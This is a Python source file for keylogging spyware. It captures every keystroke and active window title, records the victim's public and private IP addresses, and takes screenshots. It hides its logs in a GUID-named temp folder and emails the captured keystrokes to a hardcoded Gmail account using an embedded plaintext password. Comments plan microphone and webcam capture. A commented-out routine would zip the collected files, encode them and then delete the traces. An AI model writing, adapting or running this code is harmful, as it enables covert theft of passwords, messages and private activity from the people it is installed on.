# Third Party Modules
from pynput.keyboard import Listener as k_Listener
import mss.tools

# TODO Replace this with a cross platform lib
try:
    import win32gui  # To get active window name
except:
    pass

# Standard Modules
import os
import time
import requests
import socket
import sys
import smtplib


# User Defined Modules
from LogModel import LogModel
from UserModel import UserModel


# TODO Microphone Access
# TODO Webcam Access


class Logger:

    def __init__(self, queue):

        # Get time
        self.datetime = time.ctime(time.time())

        # To store previously active application
        self.old_app = ''
        self.old_file = ''
        self.user = ''
        self.public_ip = ''
        self.tracks = []
        self.track_hashes = []
        self.queue = queue

        if sys.platform in ['Windows', 'win32', 'cygwin']:
            self.user = os.path.expanduser('~').split("\\")[2]

        try:
            self.public_ip = requests.get('https://api.ipify.org/').text
        except Exception as msg:
            print(msg)

        # Create instance of the UserModel class
        self.User = UserModel(public_IP=self.public_ip,
                              private_IP=socket.gethostbyname(socket.gethostname()),
                              user=self.user,
                              )

        # Define document info schema
        msg_Schema = f'[START OF LOGS]\n   Date/Time: {self.datetime}\n   User-Profile: {self.User.user}\n   ' \
                     f'Public-IP: {self.User.public_IP}\n    Private-IP: {self.User.private_IP}\n\n '

        # Create instance of the LogModel class
        self.Log = LogModel(logOwner=msg_Schema, logText=[], logHeader=[])

    def log_data(self, key):

        if sys.platform in ['Windows', 'win32', 'cygwin']:
            new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())  # Get name of active window

            # If user switch app, add to log
            if new_app != self.old_app and new_app != '':
                self.Log.logHeader.append(f'\n[{self.datetime}] ~ {new_app}\n')
                self.Log.logText.append('\u26E7')
                self.old_app = new_app
            else:
                pass

        # Change default key names to more readable one
        substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                        '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                        '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

        key = str(key).strip('\'')
        if key in substitution:
            self.Log.logText.append(substitution[substitution.index(key) + 1])
        else:
            self.Log.logText.append(key)

        self.__check_events()

    # ***************** Tracks *************************************************************

    def __check_events(self):

        # TODO Optimize

        log_text = ''.join(self.Log.logText)

        for i in range(len(self.tracks)):
            if self.track_hashes[i] == hash(log_text[-len(self.tracks[i]):]):
                self.queue.put(7)

    def add_track(self, element):
        self.tracks.append(element)
        self.track_hashes.append(hash(element))

    def remove_track(self, element):

        try:
            del self.tracks[int(element)]
            return "Successfully deleted from tracks"
        except Exception as msg:
            return str(msg)

    def get_tracks(self):
        track_list = ""
        for i, tracks in enumerate(self.tracks):
            track_list += str(i) + "    " + tracks + "\n"
        return "----Tracks----\n" + track_list

    # ***************** Tracks *************************************************************

    def write_file(self):

        previous_log_text = ''
        previous_log_header = ''

        while True:

            time.sleep(60)

            dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
            if not os.path.exists(dirname):
                os.mkdir(dirname)

            filename = self.user + "".join(self.datetime.replace(":", ".")) + '.txt'
            file = dirname + "\\" + filename

            if sys.platform in ['Windows', 'win32', 'cygwin']:
                if len(self.Log.logText) > 1 and (''.join(self.Log.logText) != previous_log_text or ''.join(
                        self.Log.logHeader) != previous_log_header):
                    previous_log_text = ''.join(self.Log.logText)
                    previous_log_header = ''.join(self.Log.logHeader)
            else:
                if len(self.Log.logText) > 1 and ''.join(self.Log.logText) != previous_log_text:
                    previous_log_text = ''.join(self.Log.logText)

            if os.path.exists(self.old_file):
                os.remove(self.old_file)
            else:
                print("The file does not exist")

            self.old_file = file

            with open(file, 'w') as fp:
                fp.write(self.Log.toString())
            print('Created log file')

    def get_screenshot(self):

        # TODO Compress image

        with mss.mss() as screen:
            screen.compression_level = 9
            # Select all monitors
            monitor = screen.monitors[0]
            # Grab the picture
            im = screen.grab(monitor)
            # Get the entire PNG raw bytes
            raw_bytes = mss.tools.to_png(im.rgb, im.size, level=9)

        return raw_bytes

    def write_screenshot(self):

        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
        if not os.path.exists(dirname):
            os.mkdir(dirname)

        raw_bytes = self.get_screenshot()
        self.datetime = time.ctime(time.time())
        filename = self.user + "".join(self.datetime.replace(":", ".")) + '.png'
        path = dirname + "\\" + filename
        with open(path, "wb") as file:
            file.write(raw_bytes)

    def track_event(self):

        start_time = time.time()
        seconds = 5

        while True:
            current_time = time.time()
            elapsed_time = current_time - start_time

            self.write_screenshot()

            time.sleep(1)

            if elapsed_time > seconds:
                print("Event finished")
                self.send_email()

    # def send_event_files(self):
    #
    #     try:
    #         dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
    #         if os.path.exists(dirname):
    #             shutil.make_archive(dirname, 'zip', dirname)
    #         with open(dirname+".zip", 'rb') as file:
    #             encoded_file = base64.b64encode(file.read())
    #         os.remove(dirname + ".zip")
    #         shutil.rmtree(dirname)
    #         return encoded_file.decode()
    #     except Exception as msg:
    #         print(msg)

    def send_email(self):
        sender_email = "firstdjin@gmail.com"
        receiver_email = "firstdjin@gmail.com"
        password = "djin1234"
        message = self.Log.toString().encode()

        # TODO Add Mimes

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    def key_logger(self):
        with k_Listener(on_press=self.log_data) as k_listen:
            try:
                k_listen.join()
            except:
                pass
